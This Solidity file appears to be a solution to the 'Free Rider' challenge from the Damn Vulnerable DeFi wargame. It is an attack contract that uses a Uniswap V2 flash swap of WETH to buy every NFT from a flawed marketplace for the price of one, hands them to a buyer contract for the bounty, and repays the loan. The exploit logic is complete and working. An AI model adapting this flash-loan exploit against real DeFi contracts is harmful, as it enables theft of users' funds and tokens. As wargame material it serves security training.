// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    IUniswapV2Factory public UniswapV2Factory;
    IUniswapV2Pair public pair;
    FreeRiderNFTMarketplace public marketplace;
    FreeRiderBuyer public buyer;
    DamnValuableNFT public nft;
    address payable public weth;
    address payable public owner;

    constructor(
        address _uniswapV2Factory, 
        address payable _weth, 
        address _DVTTokenAddress,
        address payable _marketplace,
        address _nft,
        address _buyer
    ) {
        UniswapV2Factory = IUniswapV2Factory(_uniswapV2Factory);
        weth = _weth;
        owner = payable(msg.sender);
        pair = IUniswapV2Pair(UniswapV2Factory.getPair(_DVTTokenAddress, _weth));
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = DamnValuableNFT(_nft);
        buyer = FreeRiderBuyer(_buyer);
    }

    function flashSwap(uint256 _amount) external {
        // we want to specifically borrow weth
        uint256 amount0 = pair.token0() == weth ? _amount : 0;
        uint256 amount1 = pair.token1() == weth ? _amount : 0;
        
        // encoded data for `swap` to understand it's a flashloan and not just a swap
        bytes memory data = abi.encode(weth, _amount);
        pair.swap(amount0, amount1, address(this), data);
    }

    function uniswapV2Call(
        address _sender, 
        uint256 _amount0, 
        uint256 _amount1, 
        bytes calldata _data
    ) external {
        // make sure the pair is sending the tx and that _sender is this contract
        require(msg.sender == address(pair), "Caller is not the uniswap pair contract");
        require(_sender == address(this), "Flash loan taker is this contract");

        // amount borrowed
        (address tokenBorrow, uint256 amount) = abi.decode(_data, (address, uint256));

        // unwrap the ether that will be taken from the pool
        IERC20(weth).approve(weth, type(uint256).max);
        weth.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));

        // generate NFT ids array
        uint256 amountOfOffers = marketplace.amountOfOffers();
        uint256[] memory tokenIdsArray = arrayOfIntegers(amountOfOffers);

        // buy the NFTs from the exchange
        marketplace.buyMany{value: amount}(tokenIdsArray);

        // transfer the NFTs to the buyer
        bulkSafeTransferNFT(tokenIdsArray);

        // amount to repay
        uint256 amountToRepay = amount + (((amount*3)/997)+1);
        
        // repay
        weth.functionCallWithValue(abi.encodeWithSignature("deposit()"), amountToRepay);
        IERC20(weth).transfer(address(pair), amountToRepay);
    }

    function arrayOfIntegers(uint256 size) private returns (uint256[] memory) {
        uint256[] memory uintArray = new uint256[](size);
        for (uint256 i = 0; i < size; i++) {
            uintArray[i] = i;
        }
        return uintArray;
    }

    function bulkSafeTransferNFT(uint256[] memory tokenIds) private {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
        }
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external override returns (bytes4) {
        // receive the NFTs
        return IERC721Receiver.onERC721Received.selector;
    }

    function recoverETH() external {
        owner.sendValue(address(this).balance);
    }

    receive() external payable {}
}
